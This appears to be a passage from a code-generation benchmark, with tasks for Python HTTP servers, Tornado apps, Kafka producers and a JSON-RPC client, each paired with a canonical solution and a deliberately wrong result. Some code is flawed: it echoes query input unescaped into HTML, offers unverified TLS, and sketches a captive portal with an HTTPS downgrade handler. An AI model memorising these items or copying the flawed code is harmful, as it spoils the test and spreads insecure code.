None,\n        **response_kw: Any\n    ) -> BaseHTTPResponse:\n        self.num_requests += 1\n        conn.request(method, url, body=body, headers=headers or {}, timeout=timeout)\n        return conn.getresponse()\n\n    def urlopen(\n        self,\n        method: str,\n        url: str,\n        body: Any = None,\n        headers: Optional[Mapping[str, str]] = None,\n        retries: Optional[Union[Retry, bool, int]] = None,\n        timeout: Optional[Union[Timeout, float]] = None,\n        **response_kw: Any\n    ) -> BaseHTTPResponse:\n        conn = self._get_conn()\n        try:\n            return self._make_request(conn, method, url, timeout, body, headers, **response_kw)\n        finally:\n            self._put_conn(conn)\n\n    def close(self) -> None:\n        self._close_pool_connections(self.pool)\n\n    @staticmethod\n    def _close_pool_connections(pool: queue.LifoQueue[Any]) -> None:\n        while not pool.empty():\n            conn = pool.get_nowait()\n            if hasattr(conn, \"close\"):\n                conn.close()\n```"
  },
  {
    "Task_id": 230,
    "Instruction": "Task Description: Create a mock HTTP server for testing purposes that can handle various types of requests (GET, POST) and responses (JSON, redirects, status codes).\n\nClass Description: MockServer is a context manager class that creates and manages a lightweight HTTP server in a separate thread for testing HTTP client functionality. It provides endpoints for testing different HTTP scenarios.\n\nAttributes:\n- httpd: [HTTPServer] - The HTTP server instance\n- address: [str] - The server's IP address (127.0.0.1)\n- port: [int] - The dynamically assigned port number\n- thread: [Thread] - The thread running the server\n\nMethods:\n- __enter__() -> [MockServer] - Starts the server in a new thread when entering the context\n- __exit__(exc_type, exc_value, traceback) -> [None] - Shuts down the server and cleans up when exiting the context\n- urljoin(url: Optional[str]) -> [str] - Constructs a full URL by joining the base server URL with an optional path\n\nNested Class: _RequestHandler (BaseHTTPRequestHandler) - Handles incoming HTTP requests\n\nMethods:\n- do_POST() -> [None] - Handles POST requests by echoing back the request body\n- do_GET() -> [None] - Handles GET requests with various endpoints:\n  * /headers - Returns request headers as JSON\n  * /status/204 - Returns empty 204 response\n  * /redirect - Chain of redirect responses\n  * Default - Returns 404 for unknown paths\n- _send_json(body: dict, status: int = 200) -> [None] - Helper method to send JSON responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nfrom threading import Thread\nfrom urllib.parse import urljoin\nfrom typing import Optional\n\nclass _RequestHandler(BaseHTTPRequestHandler):\n    def do_POST(self) -> None:\n        content_length = int(self.headers.get(\"Content-Length\") or 0)\n        body_bytes = b\"Request body: \" + self.rfile.read(content_length)\n        self.send_response(200)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\n    def do_GET(self) -> None:\n        if self.path == \"/headers\":\n            self._send_json(dict(self.headers))\n        elif self.path == \"/status/204\":\n            self.send_response(204)\n            self.end_headers()\n        elif self.path == \"/redirect2\":\n            self.send_response(302)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/redirect\")\n            self.end_headers()\n        elif self.path == \"/redirect\":\n            self.send_response(301)\n            self.send_header(\"Content-Length\", \"0\")\n            self.send_header(\"Location\", \"/headers\")\n            self.end_headers()\n        else:\n            self._send_json({\"error\": \"unknown path\"}, status=404)\n\n    def _send_json(self, body: dict, status: int = 200) -> None:\n        body_bytes = json.dumps(body, indent=2).encode(\"utf8\")\n        self.send_response(status)\n        self.send_header(\"Content-Length\", str(len(body_bytes)))\n        self.send_header(\"Content-Type\", \"application/json\")\n        self.end_headers()\n        self.wfile.write(body_bytes)\n\nclass MockServer:\n    def __enter__(self):\n        self.httpd = HTTPServer((\"127.0.0.1\", 0), _RequestHandler)\n        self.address, self.port = self.httpd.server_address\n        self.thread = Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        self.httpd.shutdown()\n        self.thread.join()\n\n    def urljoin(self, url: Optional[str] = None) -> str:\n        return urljoin(f\"http://{self.address}:{self.port}\", url)",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport threading\nimport json\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom socketserver import TCPServer\nfrom urllib.parse import urlparse, parse_qs\nfrom typing import Optional, Dict, Any\n\n\nclass MockServer:\n    def __init__(self):\n        self.httpd: Optional[HTTPServer] = None\n        self.address: str = \"127.0.0.1\"\n        self.port: int = 0\n        self.thread: Optional[threading.Thread] = None\n\n    def urljoin(self, url: Optional[str] = None) -> str:\n        base_url = f\"http://{self.address}:{self.port}\"\n        if url is None:\n            return base_url\n        return f\"{base_url.rstrip('/')}/{url.lstrip('/')}\"\n\n    def __enter__(self):\n        class _RequestHandler(BaseHTTPRequestHandler):\n            def do_GET(self):\n                parsed_path = urlparse(self.path)\n                path = parsed_path.path\n\n                if path == \"/headers\":\n                    self.send_response(200)\n                    self.send_header(\"Content-Type\", \"application/json\")\n                    self.end_headers()\n                    self.wfile.write(json.dumps(dict(self.headers)).encode())\n                elif path.startswith(\"/status/\"):\n                    try:\n                        status_code = int(path.split(\"/\")[-1])\n                        self.send_response(status_code)\n                        self.end_headers()\n                    except ValueError:\n                        self.send_error(400, \"Invalid status code\")\n                elif path == \"/redirect\":\n                    redirect_count = int(self.headers.get(\"X-Redirect-Count\", \"3\"))\n                    if redirect_count <= 0:\n                        self.send_response(200)\n                        self.send_header(\"Content-Type\", \"text/plain\")\n                        self.end_headers()\n                        self.wfile.write(b\"Final destination\")\n                    else:\n                        self.send_response(302)\n                        self.send_header(\"Location\", self.path)\n                        self.send_header(\"X-Redirect-Count\", str(redirect_count - 1))\n                        self.end_headers()\n                else:\n                    self.send_error(404, \"Not Found\")\n\n            def do_POST(self):\n                content_length = int(self.headers.get(\"Content-Length\", 0))\n                post_data = self.rfile.read(content_length).decode()\n\n                self.send_response(200)\n                self.send_header(\"Content-Type\", \"application/json\")\n                self.end_headers()\n                self.wfile.write(json.dumps({\"received\": post_data}).encode())\n\n            def log_message(self, format, *args):\n                pass\n\n        self.httpd = TCPServer((self.address, 0), _RequestHandler)\n        self.port = self.httpd.server_address[1]\n        self.thread = threading.Thread(target=self.httpd.serve_forever)\n        self.thread.start()\n        return self\n\n    def __exit__(self, exc_type, exc_value, traceback):\n        if self.httpd:\n            self.httpd.shutdown()\n            self.httpd.server_close()\n        if self.thread and self.thread.is_alive():\n            self.thread.join()\n```"
  },
  {
    "Task_id": 232,
    "Instruction": "Task Description: Create a Python HTTP server that handles GET and POST requests, processes input sentences, and returns formatted responses.\n\nClass Description: The solution consists of two classes:\n1. `S` - A custom request handler that inherits from BaseHTTPRequestHandler\n2. `HTTPServerWrapper` - A server wrapper class that manages the HTTP server instance\n\nAttributes:\nport: int - The port number on which the server will run (default: 8765)\nserver_class: HTTPServer - The HTTP server class from http.server module\nhandler_class: S - The custom request handler class\n\nMethods:\nS._set_headers() -> None - Sets basic HTTP response headers\nS.write(text: str) -> None - Writes text to the response stream\nS.do_GET() -> None - Handles GET requests, processes sentence parameter, and returns HTML response\nS.do_HEAD() -> None - Handles HEAD requests\nS.do_POST() -> None - Handles POST requests with a simple response\nHTTPServerWrapper.run() -> None - Starts the HTTP server and begins serving requests indefinitely",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nfrom urllib.parse import parse_qs, urlparse, quote\nimport random\nimport re\n\nclass S(BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html')\n        self.end_headers()\n\n    def write(self, text: str):\n        self.wfile.write(text.encode())\n\n    def do_GET(self):\n        params = parse_qs(urlparse(self.path).query)\n        self._set_headers()\n        sentence = random.choice([\n            'HanLP\u662f\u9762\u5411\u751f\u4ea7\u73af\u5883\u7684\u81ea\u7136\u8bed\u8a00\u5904\u7406\u5de5\u5177\u5305\u3002',\n            '\u4e0a\u6d77\u534e\u5b89\u5de5\u4e1a\uff08\u96c6\u56e2\uff09\u516c\u53f8\u8463\u4e8b\u957f\u8c2d\u65ed\u5149\u548c\u79d8\u4e66\u5f20\u665a\u971e\u6765\u5230\u7f8e\u56fd\u7ebd\u7ea6\u73b0\u4ee3\u827a\u672f\u535a\u7269\u9986\u53c2\u89c2\u3002',\n            '\u5251\u6865\u5206\u6790\u516c\u53f8\u591a\u4f4d\u9ad8\u7ba1\u5bf9\u5367\u5e95\u8bb0\u8005\u8bf4\uff0c\u4ed6\u4eec\u786e\u4fdd\u4e86\u5510\u7eb3\u5fb7\u00b7\u7279\u6717\u666e\u5728\u603b\u7edf\u5927\u9009\u4e2d\u83b7\u80dc\u3002',\n            '\u6536\u4ef6\u4eba\u5728\u4e07\u535a\u00b7\u9f50\u90fd\u56fd\u9645\u7eff\u8335\u82b1\u56ed\uff08\u4e1c\u95e8\uff09A8\u680b\uff0c\u9760\u8fd1\u6cf0\u5c71\u62a4\u7406\u804c\u4e1a\u5b66\u9662\u3002',\n            '\u4ed6\u5728\u6d59\u6c5f\u91d1\u534e\u51fa\u751f\uff0c\u4ed6\u7684\u540d\u5b57\u53eb\u91d1\u534e\u3002',\n            '\u603b\u7edf\u666e\u4eac\u4e0e\u7279\u6717\u666e\u901a\u7535\u8bdd\u8ba8\u8bba\u7f8e\u56fd\u592a\u7a7a\u63a2\u7d22\u6280\u672f\u516c\u53f8\u3002'\n        ])\n        if 'sentence' in params:\n            s = params['sentence']\n            if len(s):\n                sentence = s[0].strip()\n        punctuation = re.compile('[\u3002\uff01\uff1f!?]')\n        sentence = sentence[:len(punctuation.split(sentence)[0]) + 1]\n        sentence = sentence.replace(' ', '')\n        MAX_LENGTH = 50\n        if len(sentence) > MAX_LENGTH:\n            sentence = '\u8bf7\u8f93\u5165{}\u5b57\u4ee5\u5185\u7684\u53e5\u5b50'.format(MAX_LENGTH)\n        self.write(f\"<html><body><h1>{sentence}</h1></body></html>\")\n\n    def do_HEAD(self):\n        self._set_headers()\n\n    def do_POST(self):\n        self._set_headers()\n        self.write(\"<html><body><h1>POST!</h1></body></html>\")\n\nclass HTTPServerWrapper:\n    def __init__(self, port=8765):\n        self.port = port\n        self.server_class = HTTPServer\n        self.handler_class = S\n\n    def run(self):\n        server_address = ('', self.port)\n        httpd = self.server_class(server_address, self.handler_class)\n        print(f'\u670d\u52a1\u5668\u5df2\u542f\u52a8 http://localhost:{self.port}')\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nfrom urllib.parse import urlparse, parse_qs\n\nclass S(http.server.BaseHTTPRequestHandler):\n    def _set_headers(self):\n        self.send_response(200)\n        self.send_header('Content-type', 'text/html; charset=utf-8')\n        self.end_headers()\n\n    def write(self, text):\n        self.wfile.write(text.encode('utf-8'))\n\n    def do_GET(self):\n        parsed_path = urlparse(self.path)\n        query_params = parse_qs(parsed_path.query)\n        sentence = query_params.get('sentence', [''])[0]\n\n        self._set_headers()\n        self.write(f\"<html><body><h1>Received Sentence:</h1><p>{sentence}</p></body></html>\")\n\n    def do_HEAD(self):\n        self._set_headers()\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length).decode('utf-8')\n        self._set_headers()\n        self.write(f\"POST received: {post_data}\")\n\nclass HTTPServerWrapper:\n    port = 8765\n    server_class = http.server.HTTPServer\n    handler_class = S\n\n    @classmethod\n    def run(cls):\n        with cls.server_class(('', cls.port), cls.handler_class) as httpd:\n            print(f\"Serving on port {cls.port}\")\n            httpd.serve_forever()\n```"
  },
  {
    "Task_id": 238,
    "Instruction": "Task Description: Create a Tornado-based HTTP server that can handle GET requests and respond with a simple text message.\n\nClass Description: The TornadoServer class encapsulates the functionality to create and run a Tornado web server with a single endpoint that responds to GET requests.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8000)\n- application: tornado.web.Application - The Tornado web application instance that manages request routing\n\nMethods:\n- __init__(port: int = 8000) -> None - Initializes the server with the specified port and sets up the application routes\n- start() -> None - Starts the server by binding it to the specified port and beginning the I/O loop",
    "Canonical_solution": "import tornado.ioloop\nimport tornado.web\n\nclass TextHandler(tornado.web.RequestHandler):\n    def get(self):\n        self.write(\"Hello, world!\")\n\nclass TornadoServer:\n    def __init__(self, port: int = 8000):\n        self.port = port\n        self.application = tornado.web.Application([(r\"/text\", TextHandler)])\n\n    def start(self):\n        self.application.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.ioloop\nimport tornado.web\n\nclass TornadoServer:\n    def __init__(self, port: int = 8000) -> None:\n        self.port = port\n        self.application = tornado.web.Application([\n            (r\"/\", self.MainHandler),\n        ])\n\n    class MainHandler(tornado.web.RequestHandler):\n        def get(self):\n            self.write(\"Hello from Tornado server!\")\n\n    def start(self) -> None:\n        self.application.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n```"
  },
  {
    "Task_id": 24,
    "Instruction": "Task Description: Create a function to send metric data to the Librato metrics service using HTTP POST requests with basic authentication.\n\nFunction Description: The function `count` sends a counter metric to Librato's API. It establishes an HTTPS connection to the metrics API server, sends the metric data as a URL-encoded form, and includes basic authentication headers. The function handles the case where authentication credentials are not configured by doing nothing.\n\nInput:\n- `name` (str): The name of the counter metric to be sent\n- `value` (int, optional): The value to increment the counter by (defaults to 1)\n\nOutput: None (The function doesn't return any value, but sends data to the external metrics service)",
    "Canonical_solution": "from ConfigParser import NoOptionError, NoSectionError\nimport base64\nimport httplib\nimport urllib\nfrom blueprint import cfg\n\ntry:\n    token = cfg.get('librato', 'token')\n    username = cfg.get('librato', 'username')\n    auth = 'Basic {0}'.format(base64.b64encode('{0}:{1}'.format(username,\n                                                                token)))\nexcept (NoOptionError, NoSectionError):\n    auth = None\n\ndef count(name, value=1):\n    if auth is None:\n        return\n    conn = httplib.HTTPSConnection('metrics-api.librato.com')\n    conn.request('POST',\n                 '/v1/counters/{0}.json'.format(urllib.quote(name)),\n                 urllib.urlencode({'value': value}),\n                 {'Authorization': auth,\n                  'Content-Type': 'application/x-www-form-urlencoded'})\n    r = conn.getresponse()\n    conn.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport os\nimport requests\nfrom requests.auth import HTTPBasicAuth\n\ndef count(name, value=1):\n    LIBRATO_USER = os.getenv('LIBRATO_USER')\n    LIBRATO_TOKEN = os.getenv('LIBRATO_TOKEN')\n\n    if not LIBRATO_USER or not LIBRATO_TOKEN:\n        return\n\n    url = 'https://metrics.librato.com/v1/measurements'\n    data = {\n        'source': 'default',\n        'measurements[]': f'counter:{name} {value}'\n    }\n\n    response = requests.post(\n        url,\n        data=data,\n        auth=HTTPBasicAuth(LIBRATO_USER, LIBRATO_TOKEN),\n        headers={'Content-Type': 'application/x-www-form-urlencoded'}\n    )\n\n    response.raise_for_status()\n```"
  },
  {
    "Task_id": 240,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server using the Tornado framework to handle backend requests and serve static content, with support for both HTTP and HTTPS connections.\n\nClass Description: The HTTPServer class initializes and runs a Tornado-based web server that can handle backend API requests and serve static files, with separate configurations for HTTP and HTTPS ports.\n\nAttributes:\n- ip: str - The IP address to bind the server to\n- port: int - The HTTP port number to listen on\n- ssl_port: int - The HTTPS port number to listen on\n- template: object - An object providing template paths for static content\n- em: object - An event manager object providing backend functionality\n\nMethods:\n- __init__(ip: str, port: int, ssl_port: int, template: object, em: object) -> None - Initializes the server with configuration parameters\n- run() -> None - Starts the HTTP and HTTPS servers and begins the I/O loop\n\nAdditional Class Descriptions:\n\nBackendHandler (extends tornado.web.RequestHandler):\n- Purpose: Handles POST requests to the backend API endpoint\nAttributes:\n- em: object - Event manager object providing backend methods\nMethods:\n- initialize(em: object) -> None - Initializes the handler with the event manager\n- post() -> None - Processes POST requests, executes backend methods, and returns JSON responses\n\nCaptivePortalHandler (mentioned but not shown in reference):\n- Purpose: Handles requests to the captive portal (implementation not shown)\n\nDowngradeToHTTP (mentioned but not shown in reference):\n- Purpose: Handles HTTPS requests by downgrading them to HTTP (implementation not shown)",
    "Canonical_solution": "import tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\nimport json\nfrom tornado.escape import json_decode, url_unescape\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        json_obj = json_decode(self.request.body)\n        response_to_send = {}\n        backend_methods = self.em.get_backend_funcs()\n        \n        for func_name in list(json_obj.keys()):\n            if func_name in backend_methods:\n                callback = getattr(backend_methods[func_name], func_name)\n                response_to_send[func_name] = callback(json_obj[func_name])\n            else:\n                response_to_send[func_name] = \"NotFound\"\n\n        self.write(json.dumps(response_to_send))\n\nclass HTTPServer:\n    def __init__(self, ip, port, ssl_port, template, em):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n    def run(self):\n        app = tornado.web.Application(\n            [\n                (r\"/backend/.*\", BackendHandler, {\"em\": self.em}),\n                (r\"/.*\", CaptivePortalHandler),\n            ],\n            template_path=self.template.get_path(),\n            static_path=self.template.get_path_static(),\n            compiled_template_cache=False,\n            ui_methods=uimethods)\n        app.listen(self.port, address=self.ip)\n\n        ssl_app = tornado.web.Application([(r\"/.*\", DowngradeToHTTP)], port=self.port)\n        https_server = tornado.httpserver.HTTPServer(\n            ssl_app,\n            ssl_options={\n                \"certfile\": constants.PEM,\n                \"keyfile\": constants.PEM,\n            })\n        https_server.listen(self.ssl_port, address=self.ip)\n\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\nimport ssl\n\nclass BackendHandler(tornado.web.RequestHandler):\n    def initialize(self, em):\n        self.em = em\n\n    def post(self):\n        data = tornado.escape.json_decode(self.request.body)\n        result = self.em.process(data)\n        self.write(tornado.escape.json_encode(result))\n\n\nclass HTTPServer:\n    def __init__(self, ip, port, ssl_port, template, em):\n        self.ip = ip\n        self.port = port\n        self.ssl_port = ssl_port\n        self.template = template\n        self.em = em\n\n        self.application = tornado.web.Application([\n            (r\"/api\", BackendHandler, dict(em=em)),\n            (r\"/(.*)\", tornado.web.StaticFileHandler, {\"path\": template.path}),\n        ])\n\n    def run(self):\n        http_server = tornado.httpserver.HTTPServer(self.application)\n        https_server = tornado.httpserver.HTTPServer(\n            self.application,\n            ssl_options={\n                \"certfile\": \"server.crt\",\n                \"keyfile\": \"server.key\",\n            }\n        )\n\n        http_server.bind(self.port, self.ip)\n        https_server.bind(self.ssl_port, self.ip)\n\n        http_server.start()\n        https_server.start()\n\n        tornado.ioloop.IOLoop.current().start()\n```"
  },
  {
    "Task_id": 242,
    "Instruction": "Task Description: Create a Tornado-based HTTP server class that can handle incoming HTTP requests and respond appropriately. The server should be configurable to run on a specified port and include a basic request handler for demonstration purposes.\n\nClass Description: The TornadoHTTPServer class encapsulates the functionality to create and run a Tornado web server. It initializes the server with a default port (configurable), sets up request handlers, and provides a method to start the server.\n\nAttributes:\n\napp: [tornado.web.Application] - The Tornado web application instance that manages request handlers and routing.\nhttp_server: [tornado.httpserver.HTTPServer] - The HTTP server instance that will listen for incoming requests.\n\nMethods:\n\n__init__: [Name](port: int = 8000) -> None - Initializes the TornadoHTTPServer instance. Sets up the application with a default route handler and prepares the HTTP server.\nInput Parameters:\n  - port: int (default=8000) - The port number on which the server will listen.\nReturn Value: None\n\nrun: [Name]() -> None - Starts the HTTP server on the specified port and begins the I/O loop to handle incoming requests.\nInput Parameters: None\nReturn Value: None",
    "Canonical_solution": "import tornado.httpserver\nimport tornado.ioloop\nimport tornado.options\nimport tornado.web\nfrom tornado.options import define, options\n\ndefine(\"port\", default=8000, help=\"run on the given port\", type=int)\n\nclass IndexHandler(tornado.web.RequestHandler):\n    def get(self):\n        greeting = self.get_argument('greeting', 'Hello')\n        self.write(greeting + ', welcome you to read: www.itdiffer.com')\n\nclass TornadoHTTPServer:\n    def __init__(self, port=8000):\n        options.port = port\n        self.app = tornado.web.Application(handlers=[(r\"/\", IndexHandler)])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self):\n        self.http_server.listen(options.port)\n        tornado.ioloop.IOLoop.instance().start()",
    "Code_level": "Class-level",
    "FSMID_for_test": 64,
    "wrong_result": "```python\nimport tornado.web\nimport tornado.httpserver\nimport tornado.ioloop\n\nclass TornadoHTTPServer:\n    def __init__(self, port: int = 8000) -> None:\n        self.port = port\n        self.app = tornado.web.Application([\n            (r\"/\", self.MainHandler),\n        ])\n        self.http_server = tornado.httpserver.HTTPServer(self.app)\n\n    def run(self) -> None:\n        self.http_server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\n    class MainHandler(tornado.web.RequestHandler):\n        def get(self):\n            self.write(\"Hello, world\")\n```"
  },
  {
    "Task_id": 249,
    "Instruction": "Task Description: Create a Kafka producer wrapper class that simplifies message sending to Kafka topics, handles message formatting, and manages producer lifecycle.\n\nClass Description: KafkaProducerWrapper is a utility class that encapsulates Kafka producer functionality, providing methods to send messages (with optional keys), batch send messages, and properly manage producer resources. It automatically generates a unique topic name for message sending.\n\nAttributes:\n_producer: KafkaProducer - The underlying Kafka producer instance\n_topic: str - The Kafka topic name (automatically generated with UUID)\n\nMethods:\n__init__: () -> None - Initializes the Kafka producer with bootstrap servers and generates a unique topic name\nsend: (message: str | tuple[str, str]) -> None - Sends a single message to the Kafka topic (message can be either a plain string or a key-value tuple)\nfill: (messages: Iterable[str | tuple[str, str]]) -> None - Sends multiple messages to the Kafka topic and flushes the producer\nclose: () -> None - Properly closes the Kafka producer to release resources\ntopic: () -> str - Property that returns the generated topic name",
    "Canonical_solution": "from kafka import KafkaProducer\nfrom uuid import uuid4\n\nkafka_settings = {\"bootstrap_servers\": \"kafka:9092\"}\n\nclass KafkaProducerWrapper:\n    def __init__(self) -> None:\n        self._producer = KafkaProducer(\n            bootstrap_servers=kafka_settings[\"bootstrap_servers\"]\n        )\n        self._topic = f\"integration-tests-{uuid4()}\"\n\n    def send(self, message: str | tuple[str, str]) -> None:\n        if isinstance(message, tuple):\n            (key, value) = message\n        else:\n            (key, value) = str(uuid4()), message\n        self._producer.send(self._topic, key=key.encode(), value=value.encode())\n\n    def fill(self, messages: Iterable[str | tuple[str, str]]) -> None:\n        for msg in messages:\n            self.send(msg)\n        self._producer.flush()\n\n    def close(self) -> None:\n        self._producer.close()\n\n    @property\n    def topic(self) -> str:\n        return self._topic",
    "Code_level": "Class-level",
    "FSMID_for_test": 78,
    "wrong_result": "```python\nimport uuid\nfrom typing import Iterable, Union, Tuple\nfrom confluent_kafka import Producer\n\nclass KafkaProducerWrapper:\n    def __init__(self):\n        self._producer = Producer({'bootstrap.servers': 'localhost:9092'})\n        self._topic = f\"topic-{uuid.uuid4()}\"\n\n    def send(self, message: Union[str, Tuple[str, str]]) -> None:\n        if isinstance(message, tuple):\n            key, value = message\n            self._producer.produce(self._topic, key=key, value=value)\n        else:\n            self._producer.produce(self._topic, value=message)\n\n    def fill(self, messages: Iterable[Union[str, Tuple[str, str]]]) -> None:\n        for msg in messages:\n            self.send(msg)\n        self._producer.flush()\n\n    def close(self) -> None:\n        self._producer.close()\n\n    @property\n    def topic(self) -> str:\n        return self._topic\n```"
  },
  {
    "Task_id": 25,
    "Instruction": "Task Description: Create a Python class that implements JSON-RPC 2.0 client functionality over HTTP/HTTPS, capable of sending requests, validating responses, and handling connection management.\n\nClass Description: JSONRPCExecutor is a class that facilitates JSON-RPC 2.0 communication with a remote server through HTTP/HTTPS protocols. It handles connection establishment, request sending, response validation, and connection cleanup.\n\nAttributes:\n- command: Union[str, List[str]] - Command or list of commands to be executed\n- url: str - Target URL for the JSON-RPC endpoint\n- jsonrpc_method: str - JSON-RPC method name to be invoked\n- jsonrpc_params: Optional[List[Any]] - Parameters for the JSON-RPC method (default: empty list)\n- status: str - Expected HTTP status code pattern (default: \"^2\\d\\d$\")\n- result_validator: Callable[[Any], Tuple[bool, Optional[str]]] - Optional function to validate the result\n- verify_tls: bool - Flag to enable/disable TLS certificate verification (default: True)\n- method: str - HTTP method to use (default: \"POST\")\n\nMethods:\n- _send_request(conn: Union[HTTPConnection, HTTPSConnection]) -> None - Internal method to send the JSON-RPC request\n- _validate_response(response) -> bool - Internal method to validate the JSON-RPC response\n- execute() -> bool - Main method to execute the JSON-RPC call and return success status",
    "Canonical_solution": "import json\nimport ssl\nfrom http.client import HTTPConnection, HTTPSConnection\nfrom json import JSONDecodeError\nfrom typing import Any, Callable, List, Optional, Tuple, Union\n\nclass JSONRPCExecutor:\n    def __init__(\n        self,\n        command: Union[str, List[str]],\n        url: str,\n        jsonrpc_method: str,\n        jsonrpc_params: Optional[List[Any]] = None,\n        status: str = r\"^2\\d\\d$\",\n        result_validator: Callable[[Any], Tuple[bool, Optional[str]]] = None,\n        verify_tls: bool = True,\n        **kwargs,\n    ):\n        self.command = command\n        self.url = url\n        self.jsonrpc_method = jsonrpc_method\n        self.jsonrpc_params = jsonrpc_params if jsonrpc_method else []\n        self.status = status\n        self.result_validator = result_validator\n        self.verify_tls = verify_tls\n        self.method = \"POST\"\n\n    def _send_request(self, conn: Union[HTTPConnection, HTTPSConnection]):\n        req_body = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": self.jsonrpc_method,\n            \"params\": self.jsonrpc_params,\n            \"id\": repr(self),\n        }\n        conn.request(\n            method=self.method,\n            url=self.url.path,\n            body=json.dumps(req_body),\n            headers={\"Accept\": \"application/json\", \"Content-Type\": \"application/json\"},\n        )\n\n    def _validate_response(self, response):\n        try:\n            response = json.loads(response.read())\n            error = response.get(\"error\")\n            if error:\n                return False\n            assert response[\"jsonrpc\"] == \"2.0\", \"invalid jsonrpc version\"\n            assert \"id\" in response, \"no id in jsonrpc response\"\n            result = response[\"result\"]\n            if self.result_validator:\n                result_valid, reason = self.result_validator(result)\n                if not result_valid:\n                    return False\n        except (AssertionError, KeyError, UnicodeDecodeError, JSONDecodeError):\n            return False\n        return True\n\n    def execute(self):\n        try:\n            if self.url.scheme == \"http\":\n                conn = HTTPConnection(self.host, self.port)\n            elif self.url.scheme == \"https\":\n                ssl_context = None\n                if not self.verify_tls:\n                    ssl_context = ssl._create_unverified_context()\n                conn = HTTPSConnection(self.host, self.port, context=ssl_context)\n            else:\n                raise ValueError(f'Unsupported URL scheme: \"{self.url.scheme}\"')\n\n            self._send_request(conn)\n            response = conn.getresponse()\n            \n            if not self._validate_response(response):\n                return False\n\n            status = str(response.status)\n            if status == self.status or self.status_re.match(status):\n                conn.close()\n                return True\n\n        except Exception:\n            return False\n\n        return False",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport json\nimport re\nfrom typing import Union, List, Any, Optional, Callable, Tuple\nfrom http.client import HTTPConnection, HTTPSConnection\nimport ssl\n\n\nclass JSONRPCExecutor:\n    def __init__(\n        self,\n        command: Union[str, List[str]],\n        url: str,\n        jsonrpc_method: str,\n        jsonrpc_params: Optional[List[Any]] = None,\n        status: str = \"^2\\\\d\\\\d$\",\n        result_validator: Optional[Callable[[Any], Tuple[bool, Optional[str]]]] = None,\n        verify_tls: bool = True,\n        method: str = \"POST\"\n    ):\n        self.command = command\n        self.url = url\n        self.jsonrpc_method = jsonrpc_method\n        self.jsonrpc_params = jsonrpc_params or []\n        self.status = status\n        self.result_validator = result_validator\n        self.verify_tls = verify_tls\n        self.method = method\n\n    def _send_request(self, conn: Union[HTTPConnection, HTTPSConnection]) -> None:\n        payload = {\n            \"jsonrpc\": \"2.0\",\n            \"method\": self.jsonrpc_method,\n            \"params\": self.jsonrpc_params,\n            \"id\": 1\n        }\n        headers = {\"Content-Type\": \"application/json\"}\n        conn.request(self.method, self.url.split(\"://\")[1].split(\"/\", 1)[0] + \"/\", body=json.dumps(payload), headers=headers)\n\n    def _validate_response(self, response) -> bool:\n        if not re.match(self.status, str(response.status)):\n            return False\n        try:\n            data = json.loads(response.read().decode())\n            if \"error\" in data:\n                return False\n            if self.result_validator:\n                valid, _ = self.result_validator(data.get(\"result\"))\n                return valid\n            return True\n        except (ValueError, KeyError):\n            return False\n\n    def execute(self) -> bool:\n        parsed_url = self.url.split(\"://\")\n        scheme = parsed_url[0]\n        host_path = parsed_url[1].split(\"/\", 1)\n        host = host_path[0]\n        path = \"/\" + host_path[1] if len(host_path) > 1 else \"/\"\n\n        context = None\n        if not self.verify_tls and scheme == \"https\":\n            context = ssl._create_unverified_context()\n\n        conn_class = HTTPSConnection if scheme == \"https\" else HTTPConnection\n        with conn_class(host, context=context) as conn:\n            conn.path = path\n            self._send_request(conn)\n            response = conn.getresponse()\n            return self._validate_response(response)\n```"
  },
  {
    "Task_id": 254,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a CSV file and sends it as JSON messages to a specified Kafka topic, with proper resource management and message delivery guarantees.\n\nFunction Description: The function reads movie rating data from a CSV file, converts each record into a JSON message, and publishes these messages to a designated Kafka topic. It includes a 30-second initial delay (to ensure Kafka broker availability), configures the producer with appropriate settings, sends messages with a small delay between them, and properly closes the producer after sending all messages. A special \"*COMMIT*\" message is sent as the final message to indicate completion.\n\nInput: None (The function uses a hardcoded CSV file path \"./dataset.csv\" and Kafka broker address \"kafka:9092\")\n\nOutput: None (The function's effect is the messages sent to the Kafka topic, not a direct return value)",
